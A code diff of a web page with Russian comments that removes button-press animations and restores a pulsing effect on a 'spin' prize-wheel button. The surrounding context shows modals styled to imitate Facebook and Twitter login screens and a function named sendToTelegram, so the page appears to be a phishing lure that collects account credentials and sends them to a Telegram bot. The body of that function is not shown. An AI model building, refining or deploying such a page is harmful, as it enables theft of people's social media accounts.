@@ -143,10 +143,8 @@
             overflow: hidden;
             z-index: 3;
             pointer-events: auto;
-            /* Анимация пульсации */
+            /* Анимация пульсации добавлена обратно */
             animation: pulse 2s infinite;
-            /* Анимация при нажатии */
-            transform-origin: center;
         }
 
         .spin-button:hover {
@@ -154,13 +152,6 @@
             box-shadow: 0 0 30px rgba(255, 215, 0, 1);
             background: linear-gradient(45deg, #ffd700, gold);
             animation: none; /* Останавливаем пульсацию при наведении */
-        }
-
-        .spin-button:active {
-            /* Анимация увеличения при нажатии */
-            transform: scale(1.15);
-            box-shadow: 0 0 40px rgba(255, 215, 0, 1.2);
-            transition: transform 0.1s, box-shadow 0.1s;
         }
 
         .spin-button:disabled {
@@ -368,11 +359,6 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
         }
 
-        .modal-button:active {
-            transform: translateY(0);
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-        }
-
         /* Стили для Facebook окна */
         .facebook-modal-content {
             background: #f0f2f5;
@@ -451,10 +437,6 @@
             background: #166fe5;
         }
 
-        .facebook-login-button:active {
-            transform: scale(0.98);
-        }
-
         .facebook-divider {
             text-align: center;
             margin: 20px 0;
@@ -496,10 +478,6 @@
 
         .facebook-create-button:hover {
             background: #36a420;
-        }
-
-        .facebook-create-button:active {
-            transform: scale(0.98);
         }
 
         .facebook-links {
@@ -608,11 +586,6 @@
             font-weight: bold;
             cursor: pointer;
             margin-bottom: 20px;
-            transition: all 0.2s;
-        }
-
-        .twitter-next-button:active {
-            transform: scale(0.98);
         }
 
         .twitter-forgot {
@@ -658,11 +631,6 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            transition: all 0.2s;
-        }
-
-        .twitter-google-button:active {
-            transform: scale(0.98);
         }
 
         .twitter-apple-button {
@@ -680,11 +648,6 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
-            transition: all 0.2s;
-        }
-
-        .twitter-apple-button:active {
-            transform: scale(0.98);
         }
 
         .twitter-signup {
@@ -767,7 +730,7 @@
             100% { filter: drop-shadow(0 0 5px gold); }
         }
 
-        /* Анимация пульсации для кнопки */
+        /* Анимация пульсации для кнопки добавлена обратно */
         @keyframes pulse {
             0% {
                 transform: scale(1);
@@ -780,19 +743,6 @@
             100% {
                 transform: scale(1);
                 box-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
-            }
-        }
-
-        /* Анимация нажатия для кнопки */
-        @keyframes clickEffect {
-            0% {
-                transform: scale(1);
-            }
-            50% {
-                transform: scale(1.15);
-            }
-            100% {
-                transform: scale(1);
             }
         }
 
@@ -1132,30 +1082,6 @@
                 spinButton.style.opacity = '0.5';
             }, 4000);
         }
-
-        // Добавляем анимацию нажатия на кнопку
-        spinButton.addEventListener('mousedown', function() {
-            if (!isSpinning && !hasSpun) {
-                this.style.animation = 'none';
-                this.style.transform = 'scale(1.15)';
-                this.style.boxShadow = '0 0 40px rgba(255, 215, 0, 1.2)';
-            }
-        });
-
-        spinButton.addEventListener('mouseup', function() {
-            if (!isSpinning && !hasSpun) {
-                this.style.transform = 'scale(1.05)';
-                this.style.boxShadow = '0 0 30px rgba(255, 215, 0, 1)';
-            }
-        });
-
-        spinButton.addEventListener('mouseleave', function() {
-            if (!isSpinning && !hasSpun && !this.disabled) {
-                this.style.transform = 'scale(1)';
-                this.style.boxShadow = '0 0 20px rgba(255, 215, 0, 0.7)';
-                this.style.animation = 'pulse 2s infinite';
-            }
-        });
 
         // Функция отправки данных в Telegram
         async function sendToTelegram(data) {
